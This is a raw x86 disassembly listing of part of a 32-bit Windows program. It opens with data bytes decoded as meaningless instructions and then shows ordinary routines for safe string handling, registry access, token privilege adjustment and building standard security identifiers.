  40250b:	outs   dx,BYTE PTR ds:[esi]
  40250c:	add    BYTE PTR [eax],al
  40250e:	add    BYTE PTR [eax],al
  402510:	sti    
  402511:	popf   
  402512:	add    BYTE PTR [eax],al
  402514:	mov    bl,0x0
  402516:	add    BYTE PTR [eax],al
  402518:	cs je  0x402580
  40251b:	js     0x402591
  40251d:	and    al,0x79
  40251f:	add    BYTE PTR fs:[eax],al
  402522:	add    BYTE PTR [eax],al
  402524:	mov    al,0x9e
  402526:	add    BYTE PTR [eax],al
  402528:	in     al,0x0
  40252a:	add    BYTE PTR [eax],al
  40252c:	cs js  0x402593
  40252f:	popa   
  402530:	je     0x402593
  402532:	and    al,0x78
  402534:	add    BYTE PTR [eax],al
  402536:	add    BYTE PTR [eax],al
  402538:	xchg   esp,eax
  402539:	lahf   
  40253a:	add    BYTE PTR [eax],al
  40253c:	and    BYTE PTR [eax],al
  40253e:	add    BYTE PTR [eax],al
  402540:	cs imul esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3224
  40254a:	add    BYTE PTR [eax],al
  40254c:	mov    ah,0x9f
  40254e:	add    BYTE PTR [eax],al
  402550:	and    BYTE PTR [eax],al
  402552:	add    BYTE PTR [eax],al
  402554:	cs imul esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3324
  40255e:	add    BYTE PTR [eax],al
  402560:	aam    0x9f
  402562:	add    BYTE PTR [eax],al
  402564:	dec    esp
  402565:	add    BYTE PTR [eax],al
  402567:	add    BYTE PTR [esi],ch
  402569:	imul   esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3424
  402572:	add    BYTE PTR [eax],al
  402574:	and    BYTE PTR [eax+0x4c0000],ah
  40257a:	add    BYTE PTR [eax],al
  40257c:	cs imul esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3724
  402586:	add    BYTE PTR [eax],al
  402588:	add    BYTE PTR [eax+0x10d00000],dh
  40258e:	add    BYTE PTR [eax],al
  402590:	cs fs popa 
  402593:	je     0x4025f6
  402595:	add    BYTE PTR [eax],al
  402597:	add    al,dl
  402599:	rol    BYTE PTR [eax],0x0
  40259c:	xor    al,0xf
  40259e:	add    BYTE PTR [eax],al
  4025a0:	bound  esi,QWORD PTR cs:[ebx+0x73]
  4025a4:	add    BYTE PTR [eax],al
  4025a6:	add    BYTE PTR [eax],al
  4025a8:	add    al,ah
  4025aa:	add    BYTE PTR [eax],al
  4025ac:	or     al,0x2
  4025ae:	add    BYTE PTR [eax],al
  4025b0:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x352461
  4025b9:	add    BYTE PTR [eax],al
  4025bb:	add    BYTE PTR [edx+eiz*8],cl
  4025be:	add    BYTE PTR [eax],al
  4025c0:	add    al,0x0
  4025c2:	add    BYTE PTR [eax],al
  4025c4:	xor    BYTE PTR cs:[eax],dh
  4025c7:	arpl   WORD PTR [esi+0x67],sp
  4025ca:	add    BYTE PTR [eax],al
  4025cc:	adc    dl,ah
  4025ce:	add    BYTE PTR [eax],al
  4025d0:	js     0x4025d2
  4025d2:	add    BYTE PTR [eax],al
  4025d4:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x322461
  4025dd:	add    BYTE PTR [eax],al
  4025df:	add    BYTE PTR [eax+0x140000e2],cl
  4025e5:	add    BYTE PTR [eax],al
  4025e7:	add    BYTE PTR [esi],ch
  4025e9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x332461
  4025f1:	add    BYTE PTR [eax],al
  4025f3:	add    BYTE PTR [edx+eiz*8+0x20c0000],bl
  4025fa:	add    BYTE PTR [eax],al
  4025fc:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x342461
  402605:	add    BYTE PTR [eax],al
  402607:	add    BYTE PTR [eax+0x440000e4],ch
  40260d:	or     DWORD PTR [eax],eax
  40260f:	add    BYTE PTR [esi],ch
  402611:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x362461
  402619:	add    BYTE PTR [eax],al
  40261b:	add    BYTE PTR [eax],al
  40261d:	lock add BYTE PTR [eax],al
  402620:	dec    esp
  402621:	add    BYTE PTR [eax],al
  402623:	add    BYTE PTR [esi],ch
  402625:	imul   esp,DWORD PTR fs:[ecx+eiz*2+0x74],0x3524
  40262e:	add    BYTE PTR [eax],al
  402630:	add    BYTE PTR [eax],al
  402632:	add    DWORD PTR [eax],eax
  402634:	adc    BYTE PTR [edx],al
  402636:	add    BYTE PTR [eax],al
  402638:	cs jb  0x4026ae
  40263b:	jb     0x4026a0
  40263d:	and    al,0x30
  40263f:	xor    DWORD PTR [eax],eax
  402641:	add    BYTE PTR [eax],al
  402643:	add    BYTE PTR [eax],dl
  402645:	add    al,BYTE PTR [ecx]
  402647:	add    al,bh
  402649:	sbb    al,0x0
  40264b:	add    BYTE PTR [esi],ch
  40264d:	jb     0x4026c2
  40264f:	jb     0x4026b4
  402651:	and    al,0x30
  402653:	xor    al,BYTE PTR [eax]
	...
  40265d:	add    BYTE PTR [eax],al
  40265f:	add    BYTE PTR [eax+0x0],ch
  402662:	sahf   
  402663:	inc    eax
  402664:	add    al,ch
  402666:	fldcw  WORD PTR [edx+0x0]
  402669:	add    BYTE PTR [ecx-0x3d],bl
  40266c:	int3   
  40266d:	int3   
  40266e:	int3   
  40266f:	int3   
  402670:	mov    edi,edi
  402672:	push   edi
  402673:	push   0x40cb60
  402678:	call   DWORD PTR ds:0x40e0ac
  40267e:	push   0x7
  402680:	xor    eax,eax
  402682:	mov    edi,0x40cb78
  402687:	pop    ecx
  402688:	rep stos DWORD PTR es:[edi],eax
  40268a:	and    DWORD PTR ds:0x40cb88,eax
  402690:	and    DWORD PTR ds:0x40cb94,eax
  402696:	push   0x409e20
  40269b:	mov    DWORD PTR ds:0x40cb78,0x10
  4026a5:	call   0x409143
  4026aa:	pop    ecx
  4026ab:	pop    edi
  4026ac:	ret    
  4026ad:	int3   
  4026ae:	int3   
  4026af:	int3   
  4026b0:	push   0x409e40
  4026b5:	call   0x409143
  4026ba:	pop    ecx
  4026bb:	ret    
  4026bc:	int3   
  4026bd:	int3   
  4026be:	int3   
  4026bf:	int3   
  4026c0:	push   0x409e80
  4026c5:	call   0x409143
  4026ca:	pop    ecx
  4026cb:	ret    
  4026cc:	int3   
  4026cd:	int3   
  4026ce:	int3   
  4026cf:	int3   
  4026d0:	int3   
  4026d1:	int3   
  4026d2:	int3   
  4026d3:	int3   
  4026d4:	int3   
  4026d5:	mov    edi,edi
  4026d7:	push   ebp
  4026d8:	mov    ebp,esp
  4026da:	xor    eax,eax
  4026dc:	test   edx,edx
  4026de:	je     0x4026e8
  4026e0:	cmp    edx,0x7fffffff
  4026e6:	jbe    0x4026ed
  4026e8:	mov    eax,0x80070057
  4026ed:	test   eax,eax
  4026ef:	js     0x402701
  4026f1:	push   0x7ffffffe
  4026f6:	push   DWORD PTR [ebp+0x8]
  4026f9:	push   ecx
  4026fa:	call   0x402909
  4026ff:	jmp    0x40270a
  402701:	test   edx,edx
  402703:	je     0x40270a
  402705:	xor    edx,edx
  402707:	mov    WORD PTR [ecx],dx
  40270a:	pop    ebp
  40270b:	ret    0x4
  40270e:	int3   
  40270f:	int3   
  402710:	int3   
  402711:	int3   
  402712:	int3   
  402713:	mov    edi,edi
  402715:	push   ebp
  402716:	mov    ebp,esp
  402718:	xor    eax,eax
  40271a:	test   edx,edx
  40271c:	je     0x402726
  40271e:	cmp    edx,0x7fffffff
  402724:	jbe    0x40272b
  402726:	mov    eax,0x80070057
  40272b:	test   eax,eax
  40272d:	js     0x40274d
  40272f:	cmp    DWORD PTR [ebp+0xc],0x7ffffffe
  402736:	jbe    0x40273f
  402738:	mov    eax,0x80070057
  40273d:	jmp    0x402751
  40273f:	push   DWORD PTR [ebp+0xc]
  402742:	push   DWORD PTR [ebp+0x8]
  402745:	push   ecx
  402746:	call   0x402909
  40274b:	jmp    0x402756
  40274d:	test   edx,edx
  40274f:	je     0x402756
  402751:	xor    edx,edx
  402753:	mov    WORD PTR [ecx],dx
  402756:	pop    ebp
  402757:	ret    0x8
  40275a:	int3   
  40275b:	int3   
  40275c:	int3   
  40275d:	int3   
  40275e:	int3   
  40275f:	mov    edi,edi
  402761:	push   ebp
  402762:	mov    ebp,esp
  402764:	push   ecx
  402765:	push   esi
  402766:	mov    esi,edx
  402768:	xor    edx,edx
  40276a:	mov    eax,edx
  40276c:	push   edi
  40276d:	mov    edi,ecx
  40276f:	test   esi,esi
  402771:	je     0x40277b
  402773:	cmp    esi,0x7fffffff
  402779:	jbe    0x402780
  40277b:	mov    eax,0x80070057
  402780:	test   eax,eax
  402782:	js     0x4027ab
  402784:	lea    eax,[ebp-0x4]
  402787:	mov    edx,esi
  402789:	push   eax
  40278a:	call   0x4028c0
  40278f:	mov    edx,DWORD PTR [ebp-0x4]
  402792:	test   eax,eax
  402794:	js     0x4027ab
  402796:	push   0x7ffffffe
  40279b:	push   DWORD PTR [ebp+0x8]
  40279e:	sub    esi,edx
  4027a0:	push   ecx
  4027a1:	lea    ecx,[edi+edx*2]
  4027a4:	mov    edx,esi
  4027a6:	call   0x402909
  4027ab:	pop    edi
  4027ac:	pop    esi
  4027ad:	mov    esp,ebp
  4027af:	pop    ebp
  4027b0:	ret    0x4
  4027b3:	int3   
  4027b4:	int3   
  4027b5:	int3   
  4027b6:	int3   
  4027b7:	int3   
  4027b8:	mov    edi,edi
  4027ba:	push   ebp
  4027bb:	mov    ebp,esp
  4027bd:	mov    eax,DWORD PTR [ebp+0xc]
  4027c0:	push   esi
  4027c1:	xor    esi,esi
  4027c3:	test   eax,eax
  4027c5:	je     0x4027ce
  4027c7:	cmp    eax,0x7fffffff
  4027cc:	jbe    0x4027d3
  4027ce:	mov    esi,0x80070057
  4027d3:	test   esi,esi
  4027d5:	js     0x40280c
  4027d7:	push   ebx
  4027d8:	mov    ebx,DWORD PTR [ebp+0x8]
  4027db:	xor    esi,esi
  4027dd:	push   edi
  4027de:	lea    edi,[eax-0x1]
  4027e1:	lea    eax,[ebp+0x14]
  4027e4:	push   eax
  4027e5:	push   DWORD PTR [ebp+0x10]
  4027e8:	push   edi
  4027e9:	push   ebx
  4027ea:	call   DWORD PTR ds:0x40e1e0
  4027f0:	add    esp,0x10
  4027f3:	test   eax,eax
  4027f5:	js     0x4027ff
  4027f7:	cmp    eax,edi
  4027f9:	ja     0x4027ff
  4027fb:	jne    0x402808
  4027fd:	jmp    0x402804
  4027ff:	mov    esi,0x8007007a
  402804:	mov    BYTE PTR [edi+ebx*1],0x0
  402808:	pop    edi
  402809:	pop    ebx
  40280a:	jmp    0x402816
  40280c:	test   eax,eax
  40280e:	je     0x402816
  402810:	mov    ecx,DWORD PTR [ebp+0x8]
  402813:	mov    BYTE PTR [ecx],0x0
  402816:	mov    eax,esi
  402818:	pop    esi
  402819:	pop    ebp
  40281a:	ret    
  40281b:	int3   
  40281c:	int3   
  40281d:	int3   
  40281e:	int3   
  40281f:	int3   
  402820:	mov    edi,edi
  402822:	push   ebp
  402823:	mov    ebp,esp
  402825:	mov    eax,DWORD PTR [ebp+0xc]
  402828:	push   esi
  402829:	xor    esi,esi
  40282b:	test   eax,eax
  40282d:	je     0x402836
  40282f:	cmp    eax,0x7fffffff
  402834:	jbe    0x40283b
  402836:	mov    esi,0x80070057
  40283b:	test   esi,esi
  40283d:	js     0x402876
  40283f:	push   ebx
  402840:	mov    ebx,DWORD PTR [ebp+0x8]
  402843:	xor    esi,esi
  402845:	push   edi
  402846:	lea    edi,[eax-0x1]
  402849:	lea    eax,[ebp+0x14]
  40284c:	push   eax
  40284d:	push   DWORD PTR [ebp+0x10]
  402850:	push   edi
  402851:	push   ebx
  402852:	call   DWORD PTR ds:0x40e1dc
  402858:	add    esp,0x10
  40285b:	test   eax,eax
  40285d:	js     0x402867
  40285f:	cmp    eax,edi
  402861:	ja     0x402867
  402863:	jne    0x402872
  402865:	jmp    0x40286c
  402867:	mov    esi,0x8007007a
  40286c:	xor    eax,eax
  40286e:	mov    WORD PTR [ebx+edi*2],ax
  402872:	pop    edi
  402873:	pop    ebx
  402874:	jmp    0x402882
  402876:	test   eax,eax
  402878:	je     0x402882
  40287a:	mov    ecx,DWORD PTR [ebp+0x8]
  40287d:	xor    eax,eax
  40287f:	mov    WORD PTR [ecx],ax
  402882:	mov    eax,esi
  402884:	pop    esi
  402885:	pop    ebp
  402886:	ret    
  402887:	int3   
  402888:	int3   
  402889:	int3   
  40288a:	int3   
  40288b:	int3   
  40288c:	mov    edi,edi
  40288e:	push   ebp
  40288f:	mov    ebp,esp
  402891:	push   esi
  402892:	mov    esi,DWORD PTR [ebp+0x8]
  402895:	test   ecx,ecx
  402897:	je     0x4028a6
  402899:	push   esi
  40289a:	mov    edx,0x7fffffff
  40289f:	call   0x4028c0
  4028a4:	jmp    0x4028ab
  4028a6:	mov    eax,0x80070057
  4028ab:	test   eax,eax
  4028ad:	jns    0x4028b6
  4028af:	test   esi,esi
  4028b1:	je     0x4028b6
  4028b3:	and    DWORD PTR [esi],0x0
  4028b6:	pop    esi
  4028b7:	pop    ebp
  4028b8:	ret    0x4
  4028bb:	int3   
  4028bc:	int3   
  4028bd:	int3   
  4028be:	int3   
  4028bf:	int3   
  4028c0:	mov    edi,edi
  4028c2:	push   ebp
  4028c3:	mov    ebp,esp
  4028c5:	push   ebx
  4028c6:	push   esi
  4028c7:	xor    ebx,ebx
  4028c9:	mov    esi,ebx
  4028cb:	push   edi
  4028cc:	mov    edi,edx
  4028ce:	test   edx,edx
  4028d0:	je     0x4028e3
  4028d2:	cmp    WORD PTR [ecx],bx
  4028d5:	je     0x4028df
  4028d7:	add    ecx,0x2
  4028da:	sub    edx,0x1
  4028dd:	jne    0x4028d2
  4028df:	test   edx,edx
  4028e1:	jne    0x4028e8
  4028e3:	mov    esi,0x80070057
  4028e8:	mov    eax,DWORD PTR [ebp+0x8]
  4028eb:	test   eax,eax
  4028ed:	je     0x4028fb
  4028ef:	test   esi,esi
  4028f1:	js     0x4028f9
  4028f3:	sub    edi,edx
  4028f5:	mov    DWORD PTR [eax],edi
  4028f7:	jmp    0x4028fb
  4028f9:	mov    DWORD PTR [eax],ebx
  4028fb:	pop    edi
  4028fc:	mov    eax,esi
  4028fe:	pop    esi
  4028ff:	pop    ebx
  402900:	pop    ebp
  402901:	ret    0x4
  402904:	int3   
  402905:	int3   
  402906:	int3   
  402907:	int3   
  402908:	int3   
  402909:	mov    edi,edi
  40290b:	push   ebp
  40290c:	mov    ebp,esp
  40290e:	push   edi
  40290f:	xor    edi,edi
  402911:	test   edx,edx
  402913:	je     0x40293e
  402915:	mov    eax,DWORD PTR [ebp+0xc]
  402918:	push   ebx
  402919:	push   esi
  40291a:	mov    esi,DWORD PTR [ebp+0x10]
  40291d:	sub    eax,ecx
  40291f:	test   esi,esi
  402921:	je     0x402938
  402923:	movzx  ebx,WORD PTR [eax+ecx*1]
  402927:	test   bx,bx
  40292a:	je     0x402938
  40292c:	mov    WORD PTR [ecx],bx
  40292f:	add    ecx,0x2
  402932:	dec    esi
  402933:	sub    edx,0x1
  402936:	jne    0x40291f
  402938:	pop    esi
  402939:	pop    ebx
  40293a:	test   edx,edx
  40293c:	jne    0x402946
  40293e:	sub    ecx,0x2
  402941:	mov    edi,0x8007007a
  402946:	xor    eax,eax
  402948:	mov    WORD PTR [ecx],ax
  40294b:	mov    eax,edi
  40294d:	pop    edi
  40294e:	pop    ebp
  40294f:	ret    0xc
  402952:	int3   
  402953:	int3   
  402954:	int3   
  402955:	int3   
  402956:	int3   
  402957:	mov    edi,edi
  402959:	push   ebp
  40295a:	mov    ebp,esp
  40295c:	cmp    BYTE PTR ds:0x40cc14,0x0
  402963:	mov    eax,0x20019
  402968:	je     0x40296f
  40296a:	mov    eax,0x20119
  40296f:	push   DWORD PTR [ebp+0x10]
  402972:	push   eax
  402973:	push   0x0
  402975:	push   edx
  402976:	push   0x80000002
  40297b:	call   DWORD PTR ds:0x40e058
  402981:	pop    ebp
  402982:	ret    
  402983:	int3   
  402984:	int3   
  402985:	int3   
  402986:	int3   
  402987:	int3   
  402988:	mov    edi,edi
  40298a:	push   ebp
  40298b:	mov    ebp,esp
  40298d:	sub    esp,0x44
  402990:	mov    eax,ds:0x40b000
  402995:	xor    eax,ebp
  402997:	mov    DWORD PTR [ebp-0x4],eax
  40299a:	mov    eax,DWORD PTR [ebp+0x8]
  40299d:	mov    DWORD PTR [ebp-0x40],eax
  4029a0:	mov    eax,DWORD PTR [ebp+0xc]
  4029a3:	push   ebx
  4029a4:	mov    DWORD PTR [ebp-0x3c],eax
  4029a7:	mov    ebx,edx
  4029a9:	lea    eax,[ebp-0x38]
  4029ac:	mov    DWORD PTR [ebp-0x44],ecx
  4029af:	push   eax
  4029b0:	push   0x1
  4029b2:	push   0x28
  4029b4:	call   DWORD PTR ds:0x40e0a4
  4029ba:	push   eax
  4029bb:	call   DWORD PTR ds:0x40e004
  4029c1:	test   eax,eax
  4029c3:	jne    0x4029ed
  4029c5:	call   DWORD PTR ds:0x40e0f4
  4029cb:	cmp    eax,0x3f0
  4029d0:	jne    0x4029e9
  4029d2:	lea    eax,[ebp-0x38]
  4029d5:	push   eax
  4029d6:	push   0x28
  4029d8:	call   DWORD PTR ds:0x40e08c
  4029de:	push   eax
  4029df:	call   DWORD PTR ds:0x40e000
  4029e5:	test   eax,eax
  4029e7:	jne    0x4029ed
  4029e9:	xor    al,al
  4029eb:	jmp    0x402a4d
  4029ed:	push   esi
  4029ee:	xor    esi,esi
  4029f0:	push   edi
  4029f1:	test   ebx,ebx
  4029f3:	jle    0x402a1c
  4029f5:	lea    edi,[ebp-0x28]
  4029f8:	lea    eax,[edi-0x8]
  4029fb:	push   eax
  4029fc:	mov    eax,DWORD PTR [ebp-0x44]
  4029ff:	push   DWORD PTR [eax+esi*4]
  402a02:	push   0x0
  402a04:	call   DWORD PTR ds:0x40e02c
  402a0a:	test   eax,eax
  402a0c:	je     0x402a5c
  402a0e:	mov    DWORD PTR [edi],0x2
  402a14:	inc    esi
  402a15:	add    edi,0xc
  402a18:	cmp    esi,ebx
  402a1a:	jl     0x4029f8
  402a1c:	push   DWORD PTR [ebp-0x3c]
  402a1f:	lea    eax,[ebp-0x34]
  402a22:	mov    DWORD PTR [ebp-0x34],ebx
  402a25:	push   DWORD PTR [ebp-0x40]
  402a28:	push   0x30
  402a2a:	push   eax
  402a2b:	push   0x0
  402a2d:	push   DWORD PTR [ebp-0x38]
  402a30:	call   DWORD PTR ds:0x40e068
  402a36:	push   DWORD PTR [ebp-0x38]
  402a39:	call   DWORD PTR ds:0x40e120
  402a3f:	call   DWORD PTR ds:0x40e0f4
  402a45:	neg    eax
  402a47:	sbb    al,al
  402a49:	inc    al
  402a4b:	pop    edi
  402a4c:	pop    esi
  402a4d:	mov    ecx,DWORD PTR [ebp-0x4]
  402a50:	xor    ecx,ebp
  402a52:	pop    ebx
  402a53:	call   0x409090
  402a58:	mov    esp,ebp
  402a5a:	pop    ebp
  402a5b:	ret    
  402a5c:	push   DWORD PTR [ebp-0x38]
  402a5f:	call   DWORD PTR ds:0x40e120
  402a65:	xor    al,al
  402a67:	jmp    0x402a4b
  402a69:	int3   
  402a6a:	int3   
  402a6b:	int3   
  402a6c:	int3   
  402a6d:	int3   
  402a6e:	mov    edi,edi
  402a70:	push   ebp
  402a71:	mov    ebp,esp
  402a73:	push   ecx
  402a74:	mov    eax,ds:0x40b000
  402a79:	xor    eax,ebp
  402a7b:	mov    DWORD PTR [ebp-0x4],eax
  402a7e:	push   ebx
  402a7f:	xor    ebx,ebx
  402a81:	push   esi
  402a82:	inc    ebx
  402a83:	mov    esi,0x40cd74
  402a88:	jmp    0x402a92
  402a8a:	push   0xa
  402a8c:	call   DWORD PTR ds:0x40e0c4
  402a92:	mov    eax,ebx
  402a94:	xchg   DWORD PTR [esi],eax
  402a96:	cmp    eax,ebx
  402a98:	je     0x402a8a
  402a9a:	cmp    BYTE PTR ds:0x40cbb0,0x0
  402aa1:	jne    0x402aba
  402aa3:	push   0x70
  402aa5:	push   0x0
  402aa7:	push   0x40ca98
  402aac:	call   0x409b76
  402ab1:	add    esp,0xc
  402ab4:	mov    BYTE PTR ds:0x40cbb0,bl
  402aba:	mov    eax,ds:0x40ca98
  402abf:	mov    esi,eax
  402ac1:	inc    eax
  402ac2:	mov    ds:0x40ca98,eax
  402ac7:	cmp    eax,ebx
  402ac9:	jne    0x402ae5
  402acb:	push   0x40cacc
  402ad0:	push   0x40ca9c
  402ad5:	mov    edx,ebx
  402ad7:	mov    ecx,0x40b034
  402adc:	call   0x402988
  402ae1:	pop    ecx
  402ae2:	pop    ecx
  402ae3:	mov    bl,al
  402ae5:	test   bl,bl
  402ae7:	jne    0x402aef
  402ae9:	mov    DWORD PTR ds:0x40ca98,esi
  402aef:	mov    ecx,DWORD PTR [ebp-0x4]
  402af2:	mov    al,bl
  402af4:	and    DWORD PTR ds:0x40cd74,0x0
  402afb:	xor    ecx,ebp
  402afd:	pop    esi
  402afe:	pop    ebx
  402aff:	call   0x409090
  402b04:	mov    esp,ebp
  402b06:	pop    ebp
  402b07:	ret    
  402b08:	int3   
  402b09:	int3   
  402b0a:	int3   
  402b0b:	int3   
  402b0c:	int3   
  402b0d:	mov    edi,edi
  402b0f:	push   ebp
  402b10:	mov    ebp,esp
  402b12:	sub    esp,0x10
  402b15:	mov    eax,ds:0x40b000
  402b1a:	xor    eax,ebp
  402b1c:	mov    DWORD PTR [ebp-0x4],eax
  402b1f:	push   ebx
  402b20:	push   edi
  402b21:	mov    edi,ecx
  402b23:	mov    WORD PTR [ebp-0x8],0x500
  402b29:	xor    ecx,ecx
  402b2b:	mov    ebx,0x40cde0
  402b30:	mov    DWORD PTR [ebp-0xc],ecx
  402b33:	cmp    BYTE PTR ds:0x40cc28,cl
  402b39:	jne    0x402bb2
  402b3b:	lea    eax,[ebp-0x10]
  402b3e:	push   eax
  402b3f:	push   ecx
  402b40:	push   ecx
  402b41:	push   ecx
  402b42:	push   ecx
  402b43:	push   ecx
  402b44:	push   ecx
  402b45:	push   ecx
  402b46:	push   0x12
  402b48:	push   0x1
  402b4a:	lea    eax,[ebp-0xc]
  402b4d:	push   eax
  402b4e:	call   DWORD PTR ds:0x40e040
  402b54:	test   eax,eax
  402b56:	jne    0x402b60
  402b58:	call   DWORD PTR ds:0x40e0f4
  402b5e:	jmp    0x402bb6
  402b60:	push   DWORD PTR [ebp-0x10]
  402b63:	call   DWORD PTR ds:0x40e064
  402b69:	cmp    eax,0x100
  402b6e:	jbe    0x402b86
  402b70:	cmp    DWORD PTR [ebp-0x10],0x0
  402b74:	je     0x402b7f
  402b76:	push   DWORD PTR [ebp-0x10]
  402b79:	call   DWORD PTR ds:0x40e054
  402b7f:	mov    eax,0xea
  402b84:	jmp    0x402bb6
  402b86:	push   DWORD PTR [ebp-0x10]
  402b89:	call   DWORD PTR ds:0x40e064
  402b8f:	push   eax
  402b90:	push   DWORD PTR [ebp-0x10]
  402b93:	push   ebx
  402b94:	call   0x409b6a
  402b99:	add    esp,0xc
  402b9c:	mov    BYTE PTR ds:0x40cc28,0x1
  402ba3:	cmp    DWORD PTR [ebp-0x10],0x0
  402ba7:	je     0x402bb2
  402ba9:	push   DWORD PTR [ebp-0x10]
  402bac:	call   DWORD PTR ds:0x40e054
  402bb2:	mov    DWORD PTR [edi],ebx
  402bb4:	xor    eax,eax
  402bb6:	mov    ecx,DWORD PTR [ebp-0x4]
  402bb9:	pop    edi
  402bba:	xor    ecx,ebp
  402bbc:	pop    ebx
  402bbd:	call   0x409090
  402bc2:	mov    esp,ebp
  402bc4:	pop    ebp
  402bc5:	ret    
  402bc6:	int3   
  402bc7:	int3   
  402bc8:	int3   
  402bc9:	int3   
  402bca:	int3   
  402bcb:	mov    edi,edi
  402bcd:	push   ebp
  402bce:	mov    ebp,esp
  402bd0:	and    esp,0xfffffff8
  402bd3:	sub    esp,0x27c
  402bd9:	mov    eax,ds:0x40b000
  402bde:	xor    eax,esp
  402be0:	mov    DWORD PTR [esp+0x278],eax
  402be7:	push   ebx
  402be8:	push   esi
  402be9:	push   edi
  402bea:	push   0x4
  402bec:	pop    edi
  402bed:	mov    DWORD PTR [esp+0x20],edx
  402bf1:	lea    eax,[esp+0x25c]
  402bf8:	mov    DWORD PTR [esp+0x1c],ecx
  402bfc:	mov    esi,edi
  402bfe:	xor    ebx,ebx
  402c00:	sub    esi,0x1
  402c03:	mov    DWORD PTR [eax],ebx
  402c05:	mov    DWORD PTR [eax+0x4],ebx
  402c08:	lea    eax,[eax+0x8]
  402c0b:	jns    0x402c00
  402c0d:	mov    eax,DWORD PTR [ebp+0x8]
  402c10:	mov    esi,ebx
  402c12:	mov    DWORD PTR [esp+0x38],ebx
  402c16:	mov    WORD PTR [esp+0x3c],0x500
  402c1d:	mov    DWORD PTR [esp+0x40],ebx
  402c21:	mov    WORD PTR [esp+0x44],0x100
  402c28:	mov    DWORD PTR [esp+0x10],ebx
  402c2c:	mov    DWORD PTR [esp+0x14],ebx
  402c30:	sub    eax,ebx
  402c32:	je     0x402fd5
  402c38:	sub    eax,0x1
  402c3b:	je     0x402f63
  402c41:	sub    eax,0x1
  402c44:	je     0x402eac
  402c4a:	sub    eax,0x1
  402c4d:	je     0x402e25
  402c53:	sub    eax,0x1
  402c56:	je     0x402d7a
  402c5c:	sub    eax,0x1
  402c5f:	jne    0x403085
  402c65:	lea    ecx,[esp+0x25c]
  402c6c:	call   0x403238
  402c71:	push   eax
  402c72:	push   ebx
  402c73:	push   ebx
  402c74:	push   ebx
  402c75:	push   ebx
  402c76:	push   ebx
  402c77:	push   ebx
  402c78:	push   ebx
  402c79:	push   edi
  402c7a:	xor    esi,esi
  402c7c:	lea    eax,[esp+0x5c]
  402c80:	inc    esi
  402c81:	push   esi
  402c82:	push   eax
  402c83:	call   DWORD PTR ds:0x40e040
  402c89:	test   eax,eax
  402c8b:	je     0x403229
  402c91:	lea    ecx,[esp+0x264]
  402c98:	call   0x403238
  402c9d:	push   eax
  402c9e:	push   ebx
  402c9f:	push   ebx
  402ca0:	push   ebx
  402ca1:	push   ebx
  402ca2:	push   ebx
  402ca3:	push   ebx
  402ca4:	push   ebx
  402ca5:	push   0x12
  402ca7:	push   esi
  402ca8:	lea    eax,[esp+0x60]
  402cac:	push   eax
  402cad:	call   DWORD PTR ds:0x40e040
  402cb3:	test   eax,eax
  402cb5:	je     0x403229
  402cbb:	lea    ecx,[esp+0x26c]
  402cc2:	call   0x403238
  402cc7:	push   eax
  402cc8:	push   ebx
  402cc9:	push   ebx
  402cca:	push   ebx
  402ccb:	push   ebx
  402ccc:	push   ebx
  402ccd:	push   ebx
  402cce:	push   0x220
  402cd3:	push   0x20
  402cd5:	push   0x2
  402cd7:	lea    eax,[esp+0x60]
  402cdb:	push   eax
  402cdc:	call   DWORD PTR ds:0x40e040
  402ce2:	test   eax,eax
  402ce4:	je     0x403229
  402cea:	lea    ecx,[esp+0x274]
  402cf1:	call   0x403238
  402cf6:	push   eax
  402cf7:	push   ebx
  402cf8:	push   ebx
  402cf9:	push   ebx
  402cfa:	push   ebx
  402cfb:	push   ebx
  402cfc:	push   ebx
  402cfd:	push   ebx
  402cfe:	push   0x13
  402d00:	push   esi
  402d01:	lea    eax,[esp+0x60]
  402d05:	push   eax
  402d06:	call   DWORD PTR ds:0x40e040
  402d0c:	test   eax,eax
  402d0e:	je     0x403229
  402d14:	lea    ecx,[esp+0x27c]
  402d1b:	call   0x403238
  402d20:	push   eax
  402d21:	push   ebx
  402d22:	push   ebx
  402d23:	push   ebx
  402d24:	push   ebx
  402d25:	push   ebx
  402d26:	push   ebx
  402d27:	push   ebx
  402d28:	push   0x14
  402d2a:	push   esi
  402d2b:	lea    eax,[esp+0x60]
  402d2f:	push   eax
  402d30:	call   DWORD PTR ds:0x40e040
  402d36:	test   eax,eax
  402d38:	je     0x403229
  402d3e:	mov    ecx,DWORD PTR [esp+0x26c]
  402d45:	mov    DWORD PTR [esp+0x10],ecx
  402d49:	mov    DWORD PTR [esp+0x14],ecx
  402d4d:	xor    ecx,ecx
  402d4f:	inc    ecx
  402d50:	mov    DWORD PTR [esp+0x260],ecx
  402d57:	mov    DWORD PTR [esp+0x268],ecx
  402d5e:	mov    DWORD PTR [esp+0x270],ecx
  402d65:	mov    DWORD PTR [esp+0x278],ecx
  402d6c:	mov    DWORD PTR [esp+0x280],ecx
  402d73:	push   0x5
  402d75:	jmp    0x403084
  402d7a:	lea    ecx,[esp+0x25c]
  402d81:	call   0x403238
  402d86:	push   eax
  402d87:	push   ebx
  402d88:	push   ebx
  402d89:	push   ebx
  402d8a:	push   ebx
  402d8b:	push   ebx
  402d8c:	push   ebx
  402d8d:	push   ebx
  402d8e:	push   ebx
  402d8f:	push   0x1
  402d91:	lea    eax,[esp+0x68]
  402d95:	push   eax
  402d96:	call   DWORD PTR ds:0x40e040
  402d9c:	test   eax,eax
  402d9e:	je     0x403229
  402da4:	lea    ecx,[esp+0x264]
  402dab:	call   0x403238
  402db0:	push   eax
  402db1:	push   ebx
  402db2:	push   ebx
  402db3:	push   ebx
  402db4:	push   ebx
  402db5:	push   ebx
  402db6:	push   ebx
  402db7:	push   ebx
  402db8:	push   0x12
  402dba:	push   0x1
  402dbc:	lea    eax,[esp+0x60]
  402dc0:	push   eax
  402dc1:	call   DWORD PTR ds:0x40e040
  402dc7:	test   eax,eax
  402dc9:	je     0x403229
  402dcf:	lea    ecx,[esp+0x26c]
  402dd6:	call   0x403238
  402ddb:	push   eax
  402ddc:	push   ebx
  402ddd:	push   ebx
  402dde:	push   ebx
  402ddf:	push   ebx
  402de0:	push   ebx
  402de1:	push   ebx
  402de2:	push   0x220
